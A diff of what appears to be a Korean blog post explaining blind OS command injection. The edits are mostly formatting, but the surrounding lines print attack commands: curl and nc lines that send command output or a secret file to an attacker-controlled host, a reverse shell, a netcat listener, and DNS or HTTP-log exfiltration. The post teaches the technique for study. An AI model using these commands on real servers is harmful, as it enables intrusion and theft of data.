@@ -204,6 +204,7 @@ bash</tmp/1&
 > 단 명령어 중 숫자가 포함된 경우 Bash에서는 파일 디스크립터로 인식할 수 있기에, 띄어쓰기를 함께 삽입해주어야 한다.
 
 # 대역 외 (Out-of-Bound) 채널을 통한 Blind OS Injection
+<div class="notice--primary" markdown="1">
 
 > 대역 외 채널을 통한 방식은 네트워크의 인/아웃 바운드의 제한이 없는 경우 즉 공격 대상 서버의 네트워크 방화벽 규칙에 제한이 없어야 한다.
 
@@ -215,19 +216,19 @@ nslookup 명령어를 통해 공격자가 소유하고 있는 도메인에 대�
 <br>
 공격자가 본인이 소유한 도메인 dns 조회 기록을 확인 후 해당 OS Injection 취약점 유무를 판별할 수 있다. 또한 위 방법과 같이 할 경우 ‘(벡틱) 사이에 명령어가 실행된다.
 
-# curl 명령어를 사용한 Blind-Command Injection
+## curl 명령어를 사용한 Blind-Command Injection
 
 ```
 curl -d http:domainaddress.com "$(cmd)"
 ```
 
-# nc를 이용한 Blind-Command Injection
+## nc를 이용한 Blind-Command Injection
 
 ```
 & cat secret.text | nc ip port
 ```
 
-# Network Outbound
+## Network Outbound
 
 1. nc 를 이용한 reverser Shell (Telnet 동일)
 - 특정 명령어를 넘겨준 후 \| (파이프라인)을 통해 공격자가 열어놓은 서버로 출력값을 전송할 수 있다.
@@ -253,6 +254,8 @@ Telnet 또한 동일하게 사용이 가능하다.
 
 > 이 때 127.0.0.1(loopback) 으로 설정한 이유는 본인 pc 에서 nc를 통해 서버를 열었으므로 루프백 주소를 한것이며, 실제 서버를 열었다면, 서버 ip 를 기입하여야 한다.
 
+</div>
+
 # CURL / WGET를 이용한 로그 전송
 
 curl과 wget를 이용하여 웹 서버의 컨텐츠를 가져오기 위해 웹 서버에 접속할 경우 서버에서는 접속 로그를 남기게 된다. 이 특징을 이용하여, 웹 서버의 경로 혹은 Body 영역에 명령어의 실행 결과를 포함하여 전송하면 된다.
@@ -269,7 +272,7 @@ Burp Swuit 혹은 owasp zap 같은 응용프로그램을 사용하여 OAST 기�
 사진과 같이 Base64로 인코딩 된 값이 get 요청의 파라미터로 전송 되는것을 확인할 수 있다.
 이를 디코딩 할 경우 ls -al 의 결과가 출력된다.
 
-<br>
+<div class="notice--primary" markdown="1">
 위의 경우 GET 메서드를 통해 보내는 방식이며, POST를 사용할 경우 wget 및 curl을 아래와 같이
 사용할 수 있다.
 
@@ -292,6 +295,7 @@ nc -lvp 5252 -k -v
 ```
 
 이 외에도 다양한 언어를 통한 리버스쉘 커넥션이 가능하다.
+</div>
 
 # OS Command Injection으로 인한 웹쉘 업로드
 
